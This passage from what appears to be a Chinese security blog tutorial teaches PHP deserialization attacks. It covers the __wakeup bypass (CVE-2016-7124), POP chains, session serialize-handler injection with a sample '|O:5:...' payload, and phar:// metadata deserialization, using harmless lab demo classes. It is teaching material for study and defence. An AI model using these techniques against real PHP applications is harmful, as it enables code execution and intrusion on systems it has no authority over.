<span class="hljs-title">test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;w0s1np&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-string">&quot;18&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> test();<br>    <span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<br>    print_r(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://z3.ax1x.com/2021/04/09/cNI1aj.png" alt="b"></p><p>O表示对象，4表示对象名长度，test表示对象名，2表示对象成员个数，s表示字符串，4表示名称长度，<code>name</code>表示<code>name</code>值。</p><p>全部类型如下：</p><table><thead><tr><th align="center">Type</th><th align="center">Serialization examples</th></tr></thead><tbody><tr><td align="center">Null</td><td align="center"><code>N;</code></td></tr><tr><td align="center">Boolean</td><td align="center"><code>b:1;</code> <code>b:0;</code></td></tr><tr><td align="center">Integer</td><td align="center"><code>i:685230;</code> <code>i:-685230;</code></td></tr><tr><td align="center">Floating point</td><td align="center"><code>d:685230.15;</code> <code>d:INF;</code> <code>d:-INF;</code> <code>d:NAN;</code></td></tr><tr><td align="center">String</td><td align="center"><code>s:6:&quot;A to Z&quot;;</code></td></tr><tr><td align="center">Associative array</td><td align="center"><code>a:4:&#123;i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:&quot;A to Z&quot;;&#125;</code> <code>a:2:&#123;i:42;b:1;s:6:&quot;A to Z&quot;;a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;&#125;</code></td></tr><tr><td align="center">Object</td><td align="center"><code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;John&quot;;d:3.14;s:4:&quot;Jane&quot;;d:2.718;&#125;</code></td></tr></tbody></table><p>如果不是public方法，那么后面的读取方法就不一样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;w0s1np&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span>=<span class="hljs-string">&quot;18&quot;</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;man&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> test();<br>    <span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<br>    print_r(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果</p><p><img src="https://z3.ax1x.com/2021/04/09/cNockj.png" alt="b"></p><p>可以发现本来是<code>age</code>结果上面出现的是<code>testage</code>，而且<code>testage</code>长度为<code>7</code>，但是上面显示的是<code>9</code></p><p>是因为：<code>private</code>属性序列化的时候格式是%00类名%00成员名，<code>%00</code>占一个字节长度，所以<code>age</code>加了类名后变成了<code>testage</code>长度为<code>9</code></p><p>有发现本来是<code>sex</code>结果上面出现的是<code>*sex</code>，而且<code>*sex</code>的长度是<code>4</code>，但是上面显示的是<code>6</code></p><p>是因为：<code>protect</code>属性序列化的时候格式是%00*%00成员名</p><h3 id="常见魔术方法："><a href="#常见魔术方法：" class="headerlink" title="常见魔术方法："></a>常见魔术方法：</h3><table><thead><tr><th align="left">魔术方法</th><th align="left">触发条件</th></tr></thead><tbody><tr><td align="left">__construct()</td><td align="left">构造函数，创建对象时触发</td></tr><tr><td align="left">__destruct()</td><td align="left">析构函数，对象被销毁时触发</td></tr><tr><td align="left">__call()</td><td align="left">在对象上下文中调用不可访问或不存在的方法时触发</td></tr><tr><td align="left">__callStatic()</td><td align="left">在静态上下文中调用不可访问的方法时触发</td></tr><tr><td align="left">__get()</td><td align="left">用于从不可访问或不存在的属性读取数据</td></tr><tr><td align="left">__set()</td><td align="left">用于将数据写入不可访问或不存在的属性</td></tr><tr><td align="left">__isset()</td><td align="left">在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td align="left">__unset()</td><td align="left">在不可访问的属性上使用unset()时触发</td></tr><tr><td align="left">__sleep()</td><td align="left">使用serialize()函数时触发</td></tr><tr><td align="left">__weakup()</td><td align="left">被unserialize()反序列化时触发</td></tr><tr><td align="left">__toString()</td><td align="left">一个类被当做字符串时触发。用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code>应该显示些什么。此方法必须返回一个字符串，否则会产生错误</td></tr><tr><td align="left">__invoke()</td><td align="left">当尝试以调用函数的方式调用一个对象时触发</td></tr><tr><td align="left">__set_state()</td><td align="left">当调用 var_export()导出类时，此静态方法会被调用</td></tr><tr><td align="left">__clone()</td><td align="left">对象复制可以通过<code>clone</code>关键字来完成,此时将调用对象的__clone()方法</td></tr><tr><td align="left">__debuginfo()</td><td align="left">转储对象以获取应显示的属性时，此方法由var_dump()调用</td></tr></tbody></table><p>在反序列化能够利用的点必须要有相应的魔术方法配合。其中比较关键的有这几个。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__destruct</span>()</span><br><span class="hljs-function"><span class="hljs-title">__wakeup</span>()</span><br><span class="hljs-function"><span class="hljs-title">__toString</span>()</span><br><span class="hljs-function"><span class="hljs-title">__call</span>()</span><br><span class="hljs-function"><span class="hljs-title">__get</span>()</span><br></code></pre></td></tr></table></figure><p>之前复现的CMS几个反序列化漏洞，都差不多与这个有关</p><h3 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h3><p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行。</p><p>例如上面的：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;w0s1np&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;testage&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;18&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;*sex&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;man&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>改为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;w0s1np&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;testage&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;18&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;*sex&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;man&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>即可绕过<code>__wakeup()</code>魔术方法，其实这个很简单，但问题就是不要一遇到<code>__wakeup()</code>魔术方法就想到绕过它，之前有到CTF题里面，我们必须利用里面的东西，而我一看到就想到绕过导致看了很久才发现问题</p><h3 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h3><p>就是是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p><p>详情请见CMS反序列化漏洞分析，里面都写了对POP Chain 的构造分析</p><h3 id="PHP-Session反序列化漏洞"><a href="#PHP-Session反序列化漏洞" class="headerlink" title="PHP Session反序列化漏洞"></a>PHP Session反序列化漏洞</h3><h4 id="什么是-Session"><a href="#什么是-Session" class="headerlink" title="什么是 Session"></a>什么是 Session</h4><p>session英文翻译为”会话”，两个人聊天从开始到结束就构成了一个会话。PHP里的 session 主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期。</p><h4 id="什么是PHP-Session"><a href="#什么是PHP-Session" class="headerlink" title="什么是PHP Session"></a>什么是PHP Session</h4><p>可以看作是一个特殊的变量，且该变量适用于存储关于用户的会话信息，需要注意的是，该变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><h4 id="PHP-Session工作流程"><a href="#PHP-Session工作流程" class="headerlink" title="PHP Session工作流程"></a>PHP Session工作流程</h4><p><img src="https://z3.ax1x.com/2021/04/09/cNbOaD.png" alt="c"></p><p>当开始一个会话时，PHP会尝试从请求中查找会话ID，通常是使用<code>cookie</code>，如果请求包中未发现<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在响应包头中通过<code>set-cookie</code>参数发给客户端保存。</p><h3 id="PHP-Session在PHP-ini中的配置"><a href="#PHP-Session在PHP-ini中的配置" class="headerlink" title="PHP Session在PHP ini中的配置"></a>PHP Session在PHP ini中的配置</h3><p>php.ini 里面有如下六个相对重要的配置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;      <span class="hljs-comment">--设置session的存储位置</span><br><span class="hljs-keyword">session</span>.save_handler=&quot;&quot;   <span class="hljs-comment">--设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="hljs-keyword">session</span>.auto_start        <span class="hljs-comment">--指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动</span><br><span class="hljs-keyword">session</span>.serialize_handler <span class="hljs-comment">--定义用来序列化/反序列化的处理器名字，默认使用php  </span><br><span class="hljs-keyword">session</span>.upload_progress.enabled <span class="hljs-comment">--启用上传进度跟踪，并填充$ _SESSION变量，默认启用</span><br><span class="hljs-keyword">session</span>.upload_progress.cleanup <span class="hljs-comment">--读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</span><br></code></pre></td></tr></table></figure><p>例如<code>phpstudy</code>：</p><p><img src="https://z3.ax1x.com/2021/04/09/cNvKVP.png" alt="d"></p><p>即<em>session的存储路径</em></p><p><img src="https://z3.ax1x.com/2021/04/09/cNv82Q.png" alt="e"></p><p>即表明session是以文件的方式来进行存储的</p><p><img src="https://z3.ax1x.com/2021/04/09/cNvtrn.png" alt="f"></p><p>表明默认不启动session</p><p><code>session.serialize_handler = php </code></p><p>表明session的默认(反)序列化引擎使用的是php(反)序列化引擎</p><p><code>session.upload_progress.enabled on </code></p><p>表明允许上传进度跟踪，并填充<code>$ _SESSION</code>变量</p><p><code>session.upload_progress.cleanup on </code></p><p>表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)</p><h4 id="PHP-session的存储机制"><a href="#PHP-session的存储机制" class="headerlink" title="PHP session的存储机制"></a>PHP session的存储机制</h4><p>PHP session的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，</p><p><code>session.serialize_handler</code>定义的引擎共有三种：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_serialize(php&gt;5.54)</td><td>经过serialize()函数序列化处理的数组</td></tr></tbody></table><h4 id="PHP-处理器"><a href="#PHP-处理器" class="headerlink" title="PHP 处理器"></a>PHP 处理器</h4><p>首先来看看<code>session.serialize_handler</code>等于<code>php</code>时候的序列化结果，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/04/09/cNqoFg.png" alt="g"></p><p>我们到<code>session</code>存储目录查看一下<code>session</code>文件内容</p><p><img src="https://z3.ax1x.com/2021/04/09/cNqxTU.png" alt="h"></p><h4 id="PHP-session反序列化漏洞形成原理"><a href="#PHP-session反序列化漏洞形成原理" class="headerlink" title="PHP session反序列化漏洞形成原理"></a>PHP session反序列化漏洞形成原理</h4><p>反序列化的各个处理器本身是没有问题的，但是如果<code>php</code>和<code>php_serialize</code>这两个处理区混合起来使用，就会出现session反序列化漏洞。</p><p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入<code>| </code>, 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时，<code> |</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p><p>例如：<br>定义一个<code>session.php</code>，用于传入<code>session</code>的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//session.php</span><br><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看session内容：</p><p><img src="https://z3.ax1x.com/2021/04/09/cNLO9H.png" alt="i"></p><p>再定义一个 class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);   <span class="hljs-comment">//定义session引擎</span><br>session_start();   <span class="hljs-comment">//初始化session，如果你要使用session，必须先使用这句话。</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;w0s1np&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Who are you?&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;name;<br>&#125;<br>&#125;<br><span class="hljs-variable">$str</span> = <span class="hljs-keyword">new</span> Hello();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>实例化对象之后回显<code>w0s1np</code></p><p><code>session.php</code>文件处理器是<code>php_serialize</code>，<code>class.php</code>文件处理器是<code>php</code> ,  <code>session.php</code>文件得作用是传入可控得<code>session</code>值，  <code>class.php</code>文件的作用是在反序化开始触发<code>__wakeup()</code>方法的内容，反序化结束时触发 <code>__destruct()</code>方法。</p><p>漏洞利用就是在<code>session.php</code>得可控值处传入<code>  | +序列化字符</code>，然后再次访问<code>class.php</code>调用<code>session</code>的值的时候会触发。</p><p>利用脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hello</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Who are you?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;name;   <span class="hljs-comment">//这里在结束后再输出name值</span><br>    &#125;<br>&#125;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-keyword">new</span> Hello();<br>    <span class="hljs-variable">$str</span>-&gt;name = <span class="hljs-string">&quot;w0s1np&quot;</span>;<br>    <span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$str</span>);   <span class="hljs-comment">//先输出序列化的东西</span><br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://z3.ax1x.com/2021/04/09/cNOPUS.png" alt="j"></p><p>传入<code>session.php</code>的payload：<code>|O:5:&quot;Hello&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;w0s1np&quot;;&#125;</code></p><p>查看存储的session:</p><p><img src="https://z3.ax1x.com/2021/04/09/cNOEgs.png" alt="k"></p><p>此时再次访问<code>class.php</code>,结果如下：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">Who <span class="hljs-keyword">are</span> you?<br>w0s1np<br>w0s1np<br></code></pre></td></tr></table></figure><p>其实就是因为<code>php</code>需要使用<code>session</code>的时候，必须是要加 <code>|</code> 的格式，如果没查到就要新创一个<code>session</code>，但是我们用了一个脚本创了一个c<code>lass.php</code>里面一样的<code>Hello</code>类，所以当脚本代码里面序列化后的变量值传入<code>class.php</code>就可以替代<code>class.php</code>里面的变量值，要想<code>class.php</code>可以使用这个序列化，就需要加<code> |</code> ,所以先使用脚本代码得到一个可以插入<code>class.php</code>里面的序列化，再加一个 <code>| </code>,生成<code>session</code>，再当<code>class.php</code>运行时，一查<code>session</code>，发现存在，就利用该<code>session</code>来运行代码，所以也就把我们设置的变量值给输入进去了。</p><h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><h4 id="什么是Phar"><a href="#什么是Phar" class="headerlink" title="什么是Phar?"></a>什么是Phar?</h4><h5 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h5><p>Phar：Php archive<br>Phar（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源捆绑到一个归档文件中来实现应用程序和库的分发，类似于JAVA JAR的一种打包文件，自<code>PHP 5.3.0</code>起，PHP默认开启对后缀为<code>.phar</code>的文件的支持</p><p><code>Phar</code>存档最有特色的特点是它是将多个文件分组为一个文件的便捷方法。这样，<code>phar</code>存档提供了一种将完整的<code>PHP</code>应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中，此外PHP可以像在命令行上和从web服务器上的任何其他文件一样轻松地执行phar存档。</p><p><code>Phar</code>文件缺省状态是只读的，使用<code>Phar</code>文件不需要任何的配置。部署非常方便。因为我们现在需要创建一个自己的<code>Phar</code>文件，所以需要允许写入<code>Phar</code>文件，这需要修改一下<code>php.ini</code>，在<code>php.ini</code>文件末尾添加下面这段即可</p><blockquote><p>[phar]<br>phar.readonly = 0</p></blockquote><h5 id="emmm，我还是先来说一下如何生成phar的吧"><a href="#emmm，我还是先来说一下如何生成phar的吧" class="headerlink" title="emmm，我还是先来说一下如何生成phar的吧"></a>emmm，我还是先来说一下如何生成phar的吧</h5><p>phar创建方法：</p><p>我现在自己的理解就是将一些文件打包，你可以先再你的网站服务器那里创建一个项目文件夹，里面可以包含任何文件，css，php，html等都可以，再在项目文件夹的同级区域内再创建一个php文件，里面用于产生phar格式文件。然后再在网页上输入php文件就可以产生phar文件了。</p><p>phar文档的使用：</p><p>假如随便创建一个index.php文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Created by yunke.</span><br><span class="hljs-comment"> * User: yunke</span><br><span class="hljs-comment"> * Date: 2017/2/8</span><br><span class="hljs-comment"> * Time: 9:33</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;yunke.phar&quot;</span>;   <span class="hljs-comment">//就是说调用yunke.phar</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;phar://yunke.phar/Lib.php&quot;</span>;   <span class="hljs-comment">//就是说调用phar里面的lib.php文件</span><br>yunke();   <span class="hljs-comment">//使用lib.php文件里面的函数</span><br></code></pre></td></tr></table></figure><p>如果index.php文件中只有第一行，那么和不使用归档文件时，添加如下代码完全相同：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;project/index.php&quot;</span>;  <br></code></pre></td></tr></table></figure><p>如果没有第二行，那么第三行的yunke()将提示未定义，所以可见require一个phar文件时并不是导入了里面所有的文件，而只是导入了入口执行文件而已，但在实际项目中往往在这个入口文件里导入其他需要使用的文件，在本例中入口执行文件为lib.php。</p><h4 id="组成结构："><a href="#组成结构：" class="headerlink" title="组成结构："></a>组成结构：</h4><p>stub：它是phar的文件标识，格式为xxx<?php xxx;  __HALT_COMPILER();?>。</p><p>manifest：也就是meta-data，压缩文件的属性等信息，以序列化存储。</p><p>contents：压缩文件的内容。</p><p>signature：签名，放在文件末尾。</p><p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者其它文件来绕过一些上传限制;</p><p>二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化。</p><h4 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h4><p>php.ini中设置为phar.readonly=Off<br>php version&gt;=5.3.0</p><p>漏洞成因：phar  存储的  meta-data  信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化。</p><p>我们先自己创建一个phar文件吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span></span>&#123;<br>&#125;<br><br>@unlink(<span class="hljs-string">&quot;test.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;test.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar,这里意思就是产生一个test.phar文件。</span><br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);<span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> TestObject();<br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>);<span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;woshilnp&quot;</span>);<span class="hljs-comment">//添加要压缩的文件及文件内容</span><br><span class="hljs-comment">//签名自动计算</span><br><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果你要添加一个文件夹里面所以的文件那么可以使用下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;buildFromDirectory(dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/project&#x27;</span>);   <span class="hljs-comment">// 添加project里面的所有文件到yunke.phar归档文件</span><br></code></pre></td></tr></table></figure><p>emmm,大概就是这样，我们可以看下经过浏览器处理后，我们的网站根目录就产生了<code>test.phar</code>文件</p><p><img src="https://z3.ax1x.com/2021/04/09/cNv5GD.png" alt="zzz"></p><p>同样，我们也可以确定，<code>manifest</code>确实是以序列化储存的。</p><p>有序列化数据必然会有反序列化操作，php里面很多文件系统函数在 phar:// 伪协议解析 phar 文件时，都会将meta-data进行反序列化。</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello woshilnp&#x27;</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    file_get_contents(<span class="hljs-variable">$filename</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/04/09/cNv7Md.png" alt="ttt"></p><p>为什么这里可以调用析构函数呢，是因为将<code>phar.phar</code>里面的<code>TestObject</code>类实例化经过反序列化加入在上面这个代码里面，所以当脚本运行后就执行了析构函数。所以我们就可以写一些木马脚本经过<code>phar</code>序列化，再通过<code>phar://</code>伪协议，反序化加入目的代码中。</p><p>当文件系统函数的参数可控时，我们可以在不调用<code>unserialize()</code>的情况下进行反序列化操作,极大的拓展了攻击面。(这里我们就是把一些序列化的东西放入函数里面了)</p><h3 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h3><p>前言：一般出现在<code>ctf</code>里面，所以这里都是在以<code>ctf</code>里面的环境讲解</p><p>此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞</p><p>原理：<code>php</code>序列化后的字符串经过替换或者修改，导致字符串长度改变</p><h4 id="替换修改后导致序列化字符串变长"><a href="#替换修改后导致序列化字符串变长" class="headerlink" 